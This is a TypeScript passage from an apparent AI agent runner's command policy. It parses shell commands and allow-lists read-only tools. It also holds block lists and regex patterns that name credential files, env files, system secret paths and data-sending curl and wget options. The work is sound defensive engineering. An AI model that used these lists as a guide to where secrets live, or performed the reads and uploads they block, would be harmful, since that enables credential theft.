import path from "node:path";
import { bashPattern, COMMAND_OF_MAX, commandOf, commandParts, partTest } from "./machine-protocol";
import { type OutboundCode, outboundUrlProblem } from "./outbound-url";

export { maskKeyShapes } from "./outbound-url";

/**
 * Deterministic command policy for computer turns (ADR 0029, ADR 0053 §3). No
 * model: plain parsing of the call Claude Code (or Codex) wants to make. The
 * runner's permission prompt, Codex's command approvals and the server's
 * `permission_prompt` all decide with these functions, so every brain follows
 * the same rules.
 *
 * - `deniedInMissions` / `deniedMessage`: the deny list (merges, deploys,
 *   rollbacks, publishing, `gh api`, printed tokens), matched on normalized
 *   arguments (`gh -R`, `git -C/-c`): refused at once with the kind it is,
 *   never asked.
 * - `loneMerge`: the one merge the computer may run without a person, for a
 *   repository the agent's owner chose (`mergeRepos`).
 * - `gitPushes` / `heldPush` / `approvalNeeded`: where each push goes, read
 *   with git on the computer (the remote's default branch, the protected
 *   ones, the agent's own): a push to the default branch, a force push to
 *   someone else's branch or a deletion waits for a person; any other push is
 *   ordinary work. Through our git proxy the server decides those instead,
 *   so they never run from here and the refusal says where to go
 *   (`delete_branches`, a pull request). Every path that runs a command on
 *   the computer (the brain's own commands, `run_code`, skill scripts,
 *   background tasks) asks `approvalNeeded` first.
 * - `secretRead`: a call that reads keys, tokens or env files, with any read
 *   tool (Read, Glob, Grep, a shell command): refused at once too. Only calls
 *   that reach a prompt are seen: Claude Code's own reads meet the same list
 *   as deny rules (`SECRET_READ_DENY_RULES`); Codex runs the commands it deems
 *   safe (`cat`, `grep`…) without asking, so there secrets are kept from
 *   leaving rather than from being read (ADR 0053 §3).
 * - `readOnlyCall`: harmless reads (listing and reading files anywhere but
 *   secrets, read-only git, GET/HEAD fetches that save only into the
 *   mission folder; in the `plan` profile no fetch and no write at all). The
 *   runner's prompt tool allows these at once, with no card and nothing posted.
 * - `forbiddenReason`: what code never lets the judge approve (sudo, deletes
 *   and writes outside the mission folder, system services, uploads, remote
 *   shells, global installs, inline code, anything it can't read plainly).
 *   The judge only classifies what is left; the deny list stays first and hard.
 * - `badActorReason`: the rule for a run outside a mission and for `run_code`,
 *   where nobody answers a card: only obvious harm (secrets, more rights, the
 *   system, a shell handed to another machine, wiping, the proxy and firewall,
 *   the runner, other users' files), read through every wrapper.
 * - `localVerdict`: the part the computer decides by itself (the rest goes to
 *   the server, which may ask a person).
 *
 * Anything this can't parse with certainty is "not read-only" (a card).
 */

/**
 * The permission profile of a computer turn (ADR 0053 §3). `plan`: reads only
 * (no edits, read-only shell, no web, no fetches). `work`: edits in its folders,
 * and commands by this policy (a person for the rest).
 */
export type CommandProfile = "plan" | "work";

export interface CommandScope {
  /** Where the task runs (relative paths resolve here). */
  cwd: string;
  /** The mission folder and the task's own folder: writes are allowed inside. */
  folders: string[];
  /** The person's home, for `~`. */
  home?: string;
  /** The runner's own home wherever it is (`AGENTES_RUNNER_HOME`): its accounts, tokens and settings are secrets. */
  runnerHome?: string;
  /**
   * `docker` and `podman` reach the agent's own rootless engine (`DOCKER_HOST` in its runtime dir, ADR 0169 and 0209):
   * a privileged container, its capabilities and its engine's socket reach only the agent's user namespace.
   */
  rootlessContainers?: boolean;
}

type Word = { text: string; op?: undefined } | { text: string; op: "pipe" | "list" | "redirect" | "input" };

/**
 * Shell words with quotes removed and operators split out, as the shell reads
 * them: a line continuation (a backslash before a newline) is dropped, and a
 * comment (a word opening with `#`) is left out to its line's end (`seen.comment`
 * says one was). `null` when the line uses anything we don't follow: command
 * substitution, process substitution, variables, globs into hidden expansions,
 * heredocs, `&` jobs.
 */
export function shellWords(line: string, seen?: { comment?: boolean }): Word[] | null {
  const out: Word[] = [];
  let cur = "";
  let has = false;
  const push = () => {
    if (has) out.push({ text: cur });
    cur = "";
    has = false;
  };
  for (let i = 0; i < line.length; i++) {
    const c = line[i] as string;
    if (c === "'") {
      const end = line.indexOf("'", i + 1);
      if (end < 0) return null;
      cur += line.slice(i + 1, end);
      has = true;
      i = end;
      continue;
    }
    if (c === '"') {
      let j = i + 1;
      for (; j < line.length && line[j] !== '"'; j++) {
        const d = line[j] as string;
        if (d === "$" || d === "`") return null;
        if (d === "\\" && j + 1 < line.length) {
          j++;
          // A line continuation, quoted or not: the shell drops both.
          if (line[j] !== "\n") cur += line[j];
        } else cur += d;
      }
      if (j >= line.length) return null;
      has = true;
      i = j;
      continue;
    }
    if (c === "\\") {
      if (i + 1 >= line.length) return null;
      i++;
      // A line continuation: the shell drops both, and the word (or the space between two) goes on, so a `#` after
      // it still opens a comment.
      if (line[i] === "\n") continue;
      cur += line[i];
      has = true;
      continue;
    }
    if (c === "$" || c === "`" || c === "(" || c === ")" || c === "{" || c === "}") return null;
    if (c === " " || c === "\t") {
      push();
      continue;
    }
    if (c === "\n" || c === ";") {
      push();
      out.push({ text: ";", op: "list" });
      continue;
    }
    if (c === "|") {
      push();
      if (line[i + 1] === "|") {
        out.push({ text: "||", op: "list" });
        i++;
      } else if (line[i + 1] === "&") return null;
      else out.push({ text: "|", op: "pipe" });
      continue;
    }
    if (c === "&") {
      if (line[i + 1] === "&") {
        push();
        out.push({ text: "&&", op: "list" });
        i++;
        continue;
      }
      if (line[i + 1] === ">") {
        push();
        const append = line[i + 2] === ">";
        out.push({ text: append ? "&>>" : "&>", op: "redirect" });
        i += append ? 2 : 1;
        continue;
      }
      // `2>&1`: the fd duplication, harmless.
      if (cur === "" && out.at(-1)?.op === "redirect" && /^\d$/.test(line[i + 1] ?? "")) {
        out.push({ text: `&${line[i + 1]}` });
        i++;
        continue;
      }
      return null; // a background job
    }
    if (c === ">" || c === "<") {
      if (c === "<" && line[i + 1] === "<") return null; // heredoc / herestring
      // `2>`: the digit before belongs to the operator.
      const fd = /^\d$/.test(cur) ? cur : "";
      if (!fd) push();
      else {
        cur = "";
        has = false;
      }
      if (c === ">") {
        const append = line[i + 1] === ">";
        out.push({ text: `${fd}${append ? ">>" : ">"}`, op: "redirect" });
        if (append) i++;
      } else out.push({ text: "<", op: "input" });
      continue;
    }
    // A word the shell opens with `#` is a comment to the line's end, quotes and all: read as a word, `ls #'` would
    // open a quote that hid the next lines, which the shell runs. The newline after it still ends the command.
    if (c === "#" && !has) {
      if (seen) seen.comment = true;
      const end = line.indexOf("\n", i);
      if (end < 0) break;
      i = end - 1;
      continue;
    }
    cur += c;
    has = true;
  }
  push();
  return out;
}

/**
 * A script's command lines as its shell reads them, quotes kept: a line continuation (a backslash before a newline)
 * joins two lines, a comment (a word opening with `#`) is left out to its line's end, and a newline inside quotes
 * stays in its line. A quote left open takes the rest of the script, which then reads as nothing plain (`shellWords`).
 * Blank lines are left out.
 */
function shellLines(script: string): string[] {
  const lines: string[] = [];
  let cur = "";
  let word = false;
  for (let i = 0; i < script.length; i++) {
    const c = script[i] as string;
    if (c === "\\") {
      if (script[i + 1] !== "\n") {
        cur += script.slice(i, i + 2);
        word = true;
      }
      i++;
      continue;
    }
    if (c === "'" || c === '"') {
      let j = i + 1;
      while (j < script.length && script[j] !== c) j += c === '"' && script[j] === "\\" ? 2 : 1;
      cur += script.slice(i, j + 1);
      word = true;
      i = j;
      continue;
    }
    if (c === "#" && !word) {
      const end = script.indexOf("\n", i);
      if (end < 0) break;
      i = end - 1;
      continue;
    }
    if (c === "\n") {
      lines.push(cur);
      cur = "";
      word = false;
      continue;
    }
    cur += c;
    word = !/[\s;&|<>()]/.test(c);
  }
  lines.push(cur);
  return lines.filter((l) => l.trim());
}

interface Simple {
  argv: string[];
  /** Files written by `>`/`>>` (not `/dev/null`, not `2>&1`). */
  writes: string[];
  /** Files read by `<`. */
  reads: string[];
  /** Its input is the output of the command before it (`… | sh`). */
  piped?: true;
}

/** The simple commands of a line (pipelines and lists split), or null when it can't be followed. */
export function simpleCommands(line: string): Simple[] | null {
  const words = shellWords(line);
  if (!words) return null;
  const out: Simple[] = [];
  let cur: Simple = { argv: [], writes: [], reads: [] };
  for (let i = 0; i < words.length; i++) {
    const w = words[i] as Word;
    if (w.op === "pipe" || w.op === "list") {
      if (cur.argv.length === 0) return null;
      out.push(cur);
      cur = { argv: [], writes: [], reads: [], ...(w.op === "pipe" ? { piped: true as const } : {}) };
      continue;
    }
    if (w.op === "redirect" || w.op === "input") {
      const target = words[i + 1];
      if (!target || target.op) return null;
      i++;
      if (w.op === "input") cur.reads.push(target.text);
      else if (/^&\d$/.test(target.text)) continue;
      else if (target.text !== "/dev/null") cur.writes.push(target.text);
      continue;
    }
    cur.argv.push(w.text);
  }
  if (cur.argv.length === 0) return out.length ? null : [];
  out.push(cur);
  // `FOO=1 cmd`: an env assignment in front; keep it simple and refuse.
  if (out.some((s) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(s.argv[0] ?? ""))) return null;
  return out;
}

const TMP = ["/tmp", "/private/tmp", "/var/tmp", "/private/var/tmp", "/var/folders", "/private/var/folders"];

/** An absolute path on Windows: from a drive (`C:\…`, `c:/…`) or a share (`\\host\share\…`). */
const WINDOWS_ABSOLUTE = /^([a-z]:[\\/]|\\\\[^\\])/i;

/** A folder the runner may report: absolute on its computer, a POSIX path or a Windows one. */
export const absolutePath = (p: string) => p.startsWith("/") || WINDOWS_ABSOLUTE.test(p);

/** A scope on a Windows computer: its folders are on a drive or a share (`C:\Users\ada\work`). */
const windowsScope = (scope: CommandScope) => [scope.cwd, ...scope.folders].some((f) => WINDOWS_ABSOLUTE.test(f));

/**
 * A path on a Windows computer the way Windows compares it, absolute from `cwd`: in one case, `/` for either
 * separator, a drive as Git Bash writes it (`C:\Users\Ada`, `c:/users/ada` and `/c/Users/Ada` are all
 * `/c/users/ada`), a share as `//host/share/…`.
 */
function windowsPath(cwd: string, p: string): string {
  const rooted = (q: string) => {
    const s = q.replaceAll("\\", "/").toLowerCase();
    return /^[a-z]:/.test(s) ? `/${s[0]}/${s.slice(2)}` : s;
  };
  const s = rooted(p);
  const abs = s.startsWith("/") ? s : `${rooted(cwd)}/${s}`;
  return (/^\/\/[^/]/.test(abs) ? "/" : "") + path.posix.normalize(abs).replace(/(.)\/$/, "$1");
}

/** `p` made absolute from the scope's folder, as its computer compares paths (`windowsPath` on Windows). */
const absoluteIn = (scope: CommandScope, p: string) =>
  windowsScope(scope) ? windowsPath(scope.cwd, p) : path.resolve(scope.cwd, p);

function resolveIn(scope: CommandScope, p: string) {
  const q = windowsScope(scope) ? p.replaceAll("\\", "/") : p;
  const home = scope.home ?? "";
  const expanded = q === "~" ? home : q.startsWith("~/") ? path.join(home, q.slice(2)) : q;
  if (expanded.startsWith("~")) return null; // `~other`
  return absoluteIn(scope, expanded);
}

/** `p` is `root` or below it, both absolute as the scope gives them (`/` separates on every computer). */
const under = (p: string, root: string) => p === root || p.startsWith(root.endsWith("/") ? root : `${root}/`);

/** Inside the mission folder (or the task's own). */
export function insideFolders(scope: CommandScope, p: string) {
  const r = resolveIn(scope, p);
  return r !== null && scope.folders.some((f) => under(r, absoluteIn(scope, f)));
}

const insideOrTmp = (scope: CommandScope, p: string) => {
  const r = resolveIn(scope, p);
  return r !== null && (insideFolders(scope, p) || TMP.some((t) => under(r, t)));
};

/**
 * System mode: where each agent's worker keeps its own secrets, git credentials and task journal
 * (`<this>/<the agent's user>`). The agent's commands run as that user too, so only these rules keep its
 * model from reading them.
 */
export const AGENT_WORKER_HOMES = "/var/lib/agentes-runner-agents";

/**
 * System mode: Grok Build's account folders (`<this>/<account id>`, 0700, the agent's user's only while lent to it).
 * Outside the other kinds' account folders, whose closed (0711) parents Grok's sandbox can't bind: it binds every
 * folder above `GROK_HOME`, so each of them must be open to the agent's user (0755). Its folder names (account ids)
 * are listable.
 */
export const GROK_ACCOUNT_HOMES = "/var/lib/agentes-runner-grok";

/**
 * System mode's runner home (`install.sh --system`), and the state of the server's own computer
 * (`agentes-runner host`): every organization's machine token is in it.
 */
export const SYSTEM_RUNNER_HOME = "/var/lib/agentes-runner";

/**
 * In the person's home only: the native install (the app, its `.env`, its database). An agent's own folder has a
 * `.agentes` of its own: its mission's files, which it reads, and its browser's profile, which it never does.
 */
const HOME_SECRET_DIRS = [".agentes"] as const;

/**
 * The agent browser's profile, in the agent's folder: its Chrome keeps the agent's logins there (cookies that
 * Chrome on Linux encrypts with a key anyone can read, so a copy is a working login elsewhere). Only the runner
 * and that Chrome use it.
 */
export const AGENT_BROWSER_PROFILE = ".agentes/browser";

/** Whether a path (either separator) is an agent browser's profile or inside one, whoever's folder it is in. */
export const inBrowserProfile = (p: string) => /(^|[\\/])\.agentes[\\/]browser([\\/]|$)/i.test(p);

/**
 * Folders that hold keys and tokens, anywhere (the runner's own home and its agents' workers' too): nothing
 * under them is read. One list for the server's checks (`SECRET_PATH`) and Claude Code's own rules
 * (`SECRET_READ_DENY_RULES`).
 */
const SECRET_DIRS = [
  AGENT_BROWSER_PROFILE,
  ".ssh",
  ".aws",
  ".gnupg",
  ".kube",
  ".docker",
  ".azure",
  ".gcloud",
  ".password-store",
  "Keychains",
  ".agentes-runner",
  path.basename(AGENT_WORKER_HOMES),
  path.basename(GROK_ACCOUNT_HOMES),
  SYSTEM_RUNNER_HOME.slice(1),
  ".config/gh",
  ".config/gcloud",
] as const;
/**
 * Files that hold tokens, anywhere (a project's `.npmrc` or service account too; Claude Code's own sign-in;
 * beside the server's `.env`, the token of the server's own computer).
 */
const SECRET_FILES = [
  ".netrc",
  ".npmrc",
  ".pypirc",
  ".git-credentials",
  ".pgpass",
  "credentials",
  "credentials.json",
  ".credentials.json",
  "mcp-token",
  "host-computer-token",
] as const;
/**
 * Sign-ins by a name too common to refuse everywhere: Codex's own, and what an account folder
 * (`accounts/<kind>/<id>`) holds (Codex's sign-in, a coding plan's key, a Claude token root keeps).
 */
const SECRET_SIGN_IN_FILES = [
  ".codex/auth.json",
  "accounts/*/*/auth.json",
  "accounts/*/*/provider.json",
  "accounts/*/*/token.json",
] as const;
/** Env files with values in them; `.env.example` and the like hold none (`SECRET_PATH` refuses every other `.env.*`). */
const SECRET_ENV_FILES = [
  ".env",
  ".env.local",
  ".env.*.local",
  ".env.production",
  ".env.prod",
  ".env.prd",
  ".env.development",
  ".env.dev",
  ".env.staging",
  ".env.stage",
  ".env.preview",
  ".env.test",
  ".env.ci",
  ".env.qa",
  ".env.uat",
  ".env.backup",
  ".env.bak",
  ".env.old",
] as const;
/** Keys and certificates, by name. */
const SECRET_KEY_FILES = ["*.pem", "*.key", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"] as const;

const escapeRe = (s: string) => s.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&");

/** The system's own secrets, by absolute path: password hashes, sudo rules, ssh host keys, a process's environment. */
const SYSTEM_SECRETS = [
  "^/etc/(shadow|gshadow|sudoers|master\\.passwd)$",
  "^/etc/sudoers\\.d(/|$)",
  "^/etc/ssh/ssh_host_",
  "^/proc/[^/]+/environ$",
  "^/(var/)?run/secrets(/|$)",
] as const;

/**
 * Secrets a read never gets: keys, tokens, env files (not their `.env.example`
 * and the like, which hold none), the runner's own home. A key's name is its last part (`[^/]*\.pem`): `.*` would
 * scan from every `/` of a long word to its end.
 */
const SECRET_PATH = new RegExp(
  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|[^/]*\\.pem|[^/]*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$|${SYSTEM_SECRETS.join("|")}`,
  "i",
);

/** Whether a path, as written or relative to a folder, is one of those. */
export const isSecretRead = (p: string) => SECRET_PATH.test(p);

function secretPath(scope: CommandScope, p: string) {
  const r = resolveIn(scope, p);
  const home = scope.home;
  return (
    r === null ||
    SECRET_PATH.test(r) ||
    SECRET_PATH.test(p) ||
    (home !== undefined && HOME_SECRET_DIRS.some((d) => under(r, absoluteIn(scope, path.join(home, d))))) ||
    (scope.runnerHome !== undefined && under(r, absoluteIn(scope, scope.runnerHome)))
  );
}

/**
 * A command that names the variables pointing at an account's sign-in, or holding a plan's key or a Claude token
 * (PowerShell's `$env:…` and cmd's `%…%` too, in any case as Windows reads them).
 */
const SECRET_VARIABLE =
  /(\$\{?|\$env:|%)(CLAUDE_CONFIG_DIR|CODEX_HOME|ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN)\b/i;

/** A word of a line that can't be parsed plainly, without the quotes and substitution marks around it (`$(cat`, `x)`). */
/** The closing marks are trimmed by hand: a `+$` over a long run of quotes backtracks quadratically. */
const bareWord = (w: string) => {
  let end = w.length;
  while (end > 0 && ")'\"`};".includes(w[end - 1] ?? "")) end--;
  return w.slice(0, end).replace(/^[$('"`{]+/, "");
};

/**
 * A path or pattern names a secret (resolved in the scope when there is one, if it can leave the folder it
 * runs in; a bare one is tested as written).
 */
const namesSecret = (p: string, scope?: CommandScope) =>
  pathsOf(p).some(
    (q) =>
      SECRET_PATH.test(q) ||
      (scope !== undefined && (absolutePath(q) || q.startsWith("~") || q.includes("..")) && secretPath(scope, q)),
  );

/** Names a wildcard may stand for in a secret's path (`~/.s?h`, `id_*`, `.env*`): the secret folders' and files' own. */
const SECRET_NAMES = [
  ...new Set([
    ...SECRET_DIRS.map((d) => d.split("/").pop() as string),
    ...SECRET_FILES,
    ...SECRET_KEY_FILES.map((f) => f.replaceAll("*", "x")),
    ".env",
    "auth.json",
  ]),
];

/**
 * A path segment's wildcards as a pattern; like the shell, `*` and `?` don't match a leading dot. A set with a
 * reversed range (`[n-1]`, common in inline scripts) is no valid pattern: like the shell's, it matches nothing.
 */
const globPattern = (seg: string) => {
  try {
    return new RegExp(
      `^${seg.startsWith(".") ? "" : "(?!\\.)"}${seg.replace(/\[(!?)([^\][]*)\]|[*?]|[^*?[]+|\[/g, (m, not, set) =>
        m === "*"
          ? "[^/]*"
          : m === "?"
            ? "[^/]"
            : set !== undefined
              ? `[${not ? "^" : ""}${set.replace(/[\\\]^]/g, "\\$&")}]`
              : escapeRe(m),
      )}$`,
    );
  } catch {
    return /(?!)/;
  }
};

/**
 * The paths a word may name, for the secret checks: as written, with Windows' backslashes as slashes, and with each
 * wildcard segment replaced by the secret names it matches with at least half of their letters its own (`.s?h`,
 * `id_*`, `.env*`; `*`, `.*` and `*.json` stay ordinary globs).
 */
function pathsOf(word: string): string[] {
  const forms = word.includes("\\") ? [word, word.replaceAll("\\", "/")] : [word];
  return forms.flatMap((w) => {
    if (!/[*?[]/.test(w)) return [w];
    let out = [""];
    for (const [i, seg] of w.split("/").entries()) {
      const own = /[*?[]/.test(seg) ? seg.replace(/\[[^\][]*\]|[*?]/g, "").length : 0;
      const names = own >= 2 ? SECRET_NAMES.filter((n) => own * 2 >= n.length && globPattern(seg).test(n)) : [];
      const parts = names.length ? names : [seg];
      out = out.flatMap((o) => parts.map((part) => (i === 0 ? part : `${o}/${part}`))).slice(0, 64);
    }
    return [w, ...out];
  });
}

/**
 * The command a call runs, or null: Bash's (empty without one, which reads as nothing plain), Claude Code's
 * PowerShell tool's (`powershell`: PowerShell's text, read as a `powershell -Command` body is) and the command any
 * other of Claude Code's own tools carries (its Monitor, a tool a later version adds), so a new way to run commands
 * meets the same rules. An MCP server's tool is the person's own: what its command runs, and where, is that server's.
 */
export function commandCall(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
): { command: string; powershell: boolean } | null {
  const command = input?.command;
  if (toolName === "Bash") return { command: typeof command === "string" ? command : "", powershell: false };
  if (typeof command !== "string" || toolName.startsWith("mcp__")) return null;
  return { command, powershell: toolName === "PowerShell" };
}

/** Claude Code's own tools that read files, and the arguments that say where (Grep's `pattern` is a search, not a path). */
const FILE_READ_TOOLS: Record<string, readonly string[]> = {
  Read: ["file_path"],
  Glob: ["pattern", "path"],
  Grep: ["path", "glob"],
  LS: ["path"],
  NotebookRead: ["notebook_path"],
};

/**
 * A call that reads a secret (keys, tokens, env files, the runner's own home),
 * with any tool that reads: Read, Glob, Grep (by path, glob or pattern) and
 * shell commands (any word naming one, or a file read with `<`). Refused at
 * once on every path (ADR 0053 §3); a person never sees it as a card.
 */
export function secretRead(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  scope?: CommandScope,
): boolean {
  const i = input ?? {};
  const keys = Object.hasOwn(FILE_READ_TOOLS, toolName) ? FILE_READ_TOOLS[toolName] : undefined;
  if (keys) return keys.some((k) => typeof i[k] === "string" && namesSecret(i[k] as string, scope));
  const call = commandCall(toolName, i);
  if (call === null) return false;
  // PowerShell's text as `badActorReason` reads it: its backslash separates a path (`.\.env`), it escapes nothing.
  const command = call.powershell ? windowsText("powershell", call.command) : call.command;
  if (SECRET_VARIABLE.test(command)) return true;
  const cmds = simpleCommands(command);
  if (cmds) {
    return cmds.some(
      (s) =>
        s.argv.slice(1).some((a, n) => !sshKeyArg(s.argv, n + 1) && namesSecret(a, scope)) ||
        s.reads.some((r) => namesSecret(r, scope)),
    );
  }
  // Not plainly readable: any word that names a secret.
  return commandParts(command).some((part) => {
    const words = part.split(" ");
    return words.slice(1).some((w, n) => !sshKeyArg(words, n + 1) && namesSecret(bareWord(w), scope));
  });
}

/** ssh, scp and sftp read the key they are given (`-i`, `-o IdentityFile=`) to sign in; it never leaves the computer. */
const SSH_CLIENTS = new Set(["ssh", "scp", "sftp"]);
function sshKeyArg(argv: readonly string[], at: number) {
  if (!SSH_CLIENTS.has(baseName(argv[0] ?? ""))) return false;
  const word = argv[at] ?? "";
  const before = argv[at - 1] ?? "";
  if (before === "-i" || /^-i\S/.test(word) || /^-oIdentityFile=/i.test(word)) return true;
  return before === "-o" && /^IdentityFile=/i.test(word);
}

/** Commands that only read, whatever their arguments (minus the options that write or run). */
const READ_ANY = new Set([
  "ls",
  "cat",
  "head",
  "tail",
  "stat",
  "wc",
  "du",
  "df",
  "which",
  "whereis",
  "type",
  "sw_vers",
  "uname",
  "system_profiler",
  "fc-list",
  "mdls",
  "pwd",
  "grep",
  "egrep",
  "fgrep",
  "basename",
  "dirname",
  "realpath",
  "readlink",
  "echo",
  "printf",
  "true",
  "uniq",
  "cut",
  "nl",
  "column",
  "md5",
  "md5sum",
  "shasum",
  "sha256sum",
  "otool",
  "lipo",
  "whoami",
  "id",
  "date",
]);
/** Options that make an otherwise read-only command write or run something. */
const WRITE_FLAGS: Record<string, RegExp> = {
  sort: /^(-o|--output)/,
  tree: /^-o$/,
  rg: /^(--pre|--pre-glob)/,
  file: /^-C$|^--compile/,
  identify: /^[-+]write$/,
};
const READ_WITH_FLAGS = new Set(["sort", "tree", "rg", "file", "identify"]);

const FIND_ACTIONS = /^-(delete|exec|execdir|ok|okdir|fprint|fprint0|fprintf|fls)$/;
const SIPS_READ = new Set(["-g", "--getProperty", "-1", "--oneLine"]);
/** exiftool options that write (and any `-TAG=value` assignment). */
const EXIF_WRITE =
  /^-(o|out|w|W|tagsFromFile|geotag|geosync|overwrite_original|overwrite_original_in_place|delete_original!?|restore_original|srcfile|@|k|P|config)$|^-.*=/;

const GIT_SAFE_BRANCH = new Set([
  "--list",
  "-l",
  "-a",
  "--all",
  "-r",
  "--remotes",
  "-v",
  "-vv",
  "--verbose",
  "--show-current",
  "--contains",
  "--merged",
  "--no-merged",
  "--no-color",
  "--color",
]);

/** Read-only git anywhere: status, log, diff, show, branch (listing), remote -v, rev-parse, ls-files. */
function readOnlyGit(argv: string[]) {
  let i = 1;
  // `git -C <path>` and `--no-pager` in front; `-c` (config) could run anything.
  for (; i < argv.length; i++) {
    const a = argv[i] as string;
    if (a === "-C") i++;
    else if (a === "--no-pager") continue;
    else break;
  }
  const sub = argv[i];
  const rest = argv.slice(i + 1);
  if (rest.some((a) => /^--(output|ext-diff|textconv|exec)/.test(a) || a === "-c")) return false;
  switch (sub) {
    case "status":
    case "log":
    case "diff":
    case "show":
    case "rev-parse":
    case "ls-files":
    case "shortlog":
    case "describe":
    case "blame":
      return true;
    case "branch": {
      if (rest.length === 0) return true;
      // Listing only: a bare name would create a branch.
      if (rest[0] === "--list" || rest[0] === "-l")
        return rest.slice(1).every((a) => GIT_SAFE_BRANCH.has(a) || !a.startsWith("-"));
      return rest.every((a) => GIT_SAFE_BRANCH.has(a));
    }
    case "remote":
      return (
        rest.length === 0 ||
        (rest.length === 1 && (rest[0] === "-v" || rest[0] === "--verbose")) ||
        (rest[0] === "get-url" && rest.length <= 3)
      );
    default:
      return false;
  }
}

const HTTP_URL = /^https?:\/\/[^\s]+$/i;

/** curl options that take a value (the next word, or glued: `-oout.txt`, `--output=x`). */
const CURL_ARG = new Set("A b c C D e E H m o r u U w x X y Y z".split(" "));
const CURL_ARG_LONG = new Set([
  "user-agent",
  "cookie",
  "cookie-jar",
  "continue-at",
  "dump-header",
  "referer",
  "cert",
  "header",
  "max-time",
  "connect-timeout",
  "output",
  "output-dir",
  "range",
  "user",
  "proxy-user",
  "write-out",
  "proxy",
  "request",
  "retry",
  "retry-delay",
  "retry-max-time",
  "speed-time",
  "speed-limit",
  "time-cond",
  "max-redirs",
  "max-filesize",
  "cacert",
  "resolve",
  "connect-to",
  "interface",
  "limit-rate",
  "trace",
  "trace-ascii",
  "stderr",
  "etag-save",
  "etag-compare",
  "hsts",
  "alt-svc",
  "url",
]);
/** Never auto-allowed: sending data, reading a config of options, FTP commands. */
const CURL_SENDS = /^(d|F|T|K|Q|t|P)$/;
const CURL_SENDS_LONG = /^(data.*|form.*|upload-file|json|config|quote|telnet-option|ftp-port|mail-.*|upload.*)$/;
const CURL_WRITES = new Set([
  "o",
  "D",
  "c",
  "output",
  "output-dir",
  "dump-header",
  "cookie-jar",
  "trace",
  "trace-ascii",
  "stderr",
  "etag-save",
  "hsts",
  "alt-svc",
]);

function readOnlyCurl(argv: string[], scope: CommandScope) {
  let urls = 0;
  const value = (name: string, v: string) => {
    if (name === "X" || name === "request") return /^(GET|HEAD)$/i.test(v);
    if (name === "w" || name === "write-out") return !/%output\{|%\{stderr/.test(v);
    if (name === "url") return HTTP_URL.test(v) && ++urls > 0;
    if (CURL_WRITES.has(name)) return insideFolders(scope, v);
    return true;
  };
  for (let i = 1; i < argv.length; i++) {
    const a = argv[i] as string;
    if (a.startsWith("--")) {
      const [rawName, glued] = a.slice(2).split(/=(.*)/s, 2) as [string, string | undefined];
      const name = rawName.replace(/^no-/, "");
      if (CURL_SENDS_LONG.test(name)) return false;
      if (CURL_ARG_LONG.has(name)) {
        const v = glued ?? argv[++i];
        if (v === undefined || !value(name, v)) return false;
      }
      if (name === "remote-name" || name === "remote-name-all") {
        if (!insideFolders(scope, ".")) return false;
      }
      continue;
    }
    if (a.startsWith("-") && a.length > 1) {
      for (let j = 1; j < a.length; j++) {
        const c = a[j] as string;
        if (CURL_SENDS.test(c)) return false;
        if (c === "O" || c === "J") {
          if (!insideFolders(scope, ".")) return false;
          continue;
        }
        if (CURL_ARG.has(c)) {
          const v = j + 1 < a.length ? a.slice(j + 1) : argv[++i];
          if (v === undefined || !value(c, v)) return false;
          break;
        }
      }
      continue;
    }
    if (!HTTP_URL.test(a)) return false;
    urls++;
  }
  return urls > 0;
}

const WGET_ARG_LONG = new Set([
  "output-document",
  "directory-prefix",
  "output-file",
  "append-output",
  "user-agent",
  "header",
  "timeout",
  "tries",
  "wait",
  "level",
  "user",
  "password",
  "method",
  "referer",
  "input-file",
  "accept",
  "reject",
]);
const WGET_ARG = new Set("O P o a U t T w l i A R e".split(" "));
const WGET_SENDS = /^(post-data|post-file|body-data|body-file|execute|use-askpass|config)$/;
const WGET_WRITES = new Set([
  "O",
  "P",
  "o",
  "a",
  "output-document",
  "directory-prefix",
  "output-file",
  "append-output",
]);

function readOnlyWget(argv: string[], scope: CommandScope) {
  let urls = 0;
  // Without -O / -P it saves into the current folder.
  let savesHere = true;
  const value = (name: string, v: string) => {
    if (name === "method") return /^(GET|HEAD)$/i.test(v);
    if (name === "e") return false;
    if (WGET_WRITES.has(name)) {
      if (name === "O" || name === "output-document" || name === "P" || name === "directory-prefix") savesHere = false;
      return v === "-" || v === "/dev/null" || insideFolders(scope, v);
    }
    return true;
  };
  for (let i = 1; i < argv.length; i++) {
    const a = argv[i] as string;
    if (a.startsWith("--")) {
      const [name, glued] = a.slice(2).split(/=(.*)/s, 2) as [string, string | undefined];
      if (WGET_SENDS.test(name)) return false;
      if (WGET_ARG_LONG.has(name)) {
        const v = glued ?? argv[++i];
        if (v === undefined || !value(name, v)) return false;
      }
      if (name === "spider") savesHere = false;
      continue;
    }
    if (a.startsWith("-") && a.length > 1) {
      for (let j = 1; j < a.length; j++) {
        const c = a[j] as string;
        if (WGET_ARG.has(c)) {
          const v = j + 1 < a.length ? a.slice(j + 1) : argv[++i];
          if (v === undefined || !value(c, v)) return false;
          break;
        }
      }
      continue;
    }
    if (!HTTP_URL.test(a)) return false;
    urls++;
  }
  return urls > 0 && (!savesHere || insideFolders(scope, "."));
}

/** Options of `git clone/fetch/pull` that could run a program or read another config: never without a person. */
const GIT_FETCH_UNSAFE =
  /^(-c|-u|--config|--upload-pack|--receive-pack|--template|--separate-git-dir|--exec|--reference|--server-option|-o)(=|$)/;

/**
 * `git clone <https url> [dir]`, `git fetch` and `git pull` that only bring
 * code into the agent's (or mission's) folders: allowed without a person (ADR
 * 0024 addendum). In the agent's checkouts the remote is our git proxy (its
 * credential, its repositories); the deny list still stops pushes to the
 * default branch, force pushes and merges of pull requests.
 */
function fetchIntoFolders(argv: string[], scope: CommandScope) {
  let i = 1;
  let where = ".";
  for (; i < argv.length; i++) {
    const a = argv[i] as string;
    if (a === "-C") {
      const dir = argv[++i];
